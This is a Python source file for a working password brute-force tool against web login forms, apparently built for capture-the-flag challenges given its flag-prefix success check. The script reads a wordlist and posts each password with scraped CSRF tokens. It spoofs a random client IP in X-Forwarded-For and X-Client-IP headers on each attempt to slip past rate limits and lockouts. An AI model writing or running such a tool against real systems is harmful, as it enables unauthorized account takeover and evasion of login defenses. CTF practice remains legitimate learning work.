import requests
import random
import time
from bs4 import BeautifulSoup
from termcolor import colored

text = colored(r"""

  ___ _____ ___   _              _
 / __|_   _| __| | |   ___  __ _(_)_ _
| (__  | | | _|  | |__/ _ \/ _` | | ' \
 \___| |_| |_|   |____\___/\__, |_|_||_|
                           |___/
 ___          _        __
| _ )_ _ _  _| |_ ___ / _|___ _ _ __ ___ _ _
| _ \ '_| || |  _/ -_)  _/ _ \ '_/ _/ -_) '_|
|___/_|  \_,_|\__\___|_| \___/_| \__\___|_|


""", "red", attrs=["bold"])

print(text)

# Configuration flags
success_strings = ["flag{", "H4G{", "H5G{"]

def random_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

def detect_protocol(url):
    if url.startswith(("http://", "https://")):
        return url

    print(colored("\n[*] Detecting protocol...", "yellow", attrs=["bold"]))
    
    try:
        if requests.get(f"https://{url}", timeout=3).status_code < 500:
            return f"https://{url}"
    except requests.RequestException:
        pass

    try:
        if requests.get(f"http://{url}", timeout=3).status_code < 500:
            return f"http://{url}"
    except requests.RequestException:
        pass

    return None

def get_input(prompt_text, default=None):
    prompt_colored = colored(f"[+] {prompt_text}", "blue", attrs=["bold"])
    if default:
        prompt_colored += colored(f" (default: {default}): ", "white")
    else:
        prompt_colored += ": "
        
    val = input(prompt_colored).strip()
    return val if val else default

def brute_force():
    target_url = get_input("Enter Target Url")
    if not target_url:
        return

    username = get_input("Enter Username")
    if not username:
        return
    
    wordlist_path = get_input("Enter Wordlist Path")
    if not wordlist_path:
        return

    delay = get_input("Enter delay between attempts (seconds)", default="1")
    try:
        delay = float(delay)
    except ValueError:
        delay = 1

    # field names (ex. inputname="password" on input tags login)
    field_user = get_input("HTML Field Name for User", default="username")
    field_pass = get_input("HTML Field Name for Pass", default="password")

    target_url = detect_protocol(target_url)
    if not target_url:
        print(colored("\n[!] Could not connect to target URL.", "red", attrs=["bold"]))
        return

    print(colored(f"\n[*] Target: {target_url}", "green", attrs=["bold"]))
    print(colored(f"[*] User: {username}", "green", attrs=["bold"]))
    print(colored(f"[*] Fields: {field_user} / {field_pass}", "green", attrs=["bold"]))
    print(colored(f"[*] Delay: {delay} seconds", "green", attrs=["bold"]))
    print(colored(f"\n[!] Ctrl + C to abort\n", "red", attrs=["bold"]))

    s = requests.Session()
    
    # Static headers (you can modify yourself)
    base_headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
        "Referer": target_url
    }

    try:
        with open(wordlist_path, "r", encoding="latin-1") as f:
            for password in f:
                password = password.strip()
                if not password: continue

                # Generate IP once per loop
                current_spoof_ip = random_ip()
                
                # Update headers with new spoofed IP
                current_headers = base_headers.copy()
                current_headers["X-Forwarded-For"] = current_spoof_ip
                current_headers["X-Client-IP"] = current_spoof_ip # Adding extra spoof header

                try:
                    # GET request to grab CSRF tokens
                    r_get = s.get(target_url, headers=current_headers, timeout=5)
                    soup = BeautifulSoup(r_get.text, 'html.parser')

                    payload = {
                        field_user: username,
                        field_pass: password
                    }

                    # Scrape hidden tokens (CSRF)
                    for hidden in soup.find_all("input", type="hidden"):
                        name = hidden.get("name")
                        value = hidden.get("value")
                        if name:
                            payload[name] = value

                    # POST request (login attempt)
                    r_post = s.post(target_url, data=payload, headers=current_headers, timeout=5)

                    # Check success
                    if any(indicator in r_post.text for indicator in success_strings):
                        print(f"\n\n==========================================")
                        print(colored(f"[+] SUCCESS! Password Found: {password}", "green", attrs=["bold"]))
                        print(f"==========================================")
                        return

                    print(f"\r{colored('[-]', 'yellow')} Trying: {password:<20} | IP: {current_spoof_ip:<15}")

                except requests.exceptions.RequestException as e:
                    print(colored(f"\n[!] Connection Error: {e}", "red"))
                    continue
                
                time.sleep(delay)

    except FileNotFoundError:
        print(colored(f"\n[!] Error: Wordlist '{wordlist_path}' not found.", "red", attrs=["bold"]))
    except KeyboardInterrupt:
        print(colored("\n\n[!] Aborted by user.", "red", attrs=["bold"]))

if __name__ == "__main__":
    brute_force()
